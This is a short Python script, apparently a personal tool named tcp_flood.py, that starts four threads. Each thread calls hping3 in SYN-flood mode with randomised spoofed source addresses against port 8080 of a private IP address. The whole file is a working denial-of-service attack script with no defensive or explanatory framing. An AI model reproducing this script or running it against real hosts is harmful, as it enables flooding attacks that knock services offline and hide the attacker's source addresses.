'''
@author: caopeng
@license: (C) Copyright 2013-2017, Node Supply Chain Manager Corporation Limited. 
@contact: woshidamayi@gmail.com
@software: dof
@file: tcp_flood.py
@time: 23/7/18 17:14
@desc: 多进程运行 hping3  linux shell
'''



import subprocess
import threading

def send_hping3(destination_ip):
    command = f"hping3 {destination_ip} -c 10000 -d 120 -S -w 64 -p 8080 --flood --rand-source"
    subprocess.call(command, shell=True)

# 创建多个线程并启动
destination_ips = ["172.16.28.157", "172.16.28.157", "172.16.28.157", "172.16.28.157"]
threads = []
for ip in destination_ips:
    thread = threading.Thread(target=send_hping3, args=(ip,))
    thread.start()
    threads.append(thread)

# 等待所有线程完成
for thread in threads:
    thread.join()

if __name__ == '__main__':
    print('Hello world')
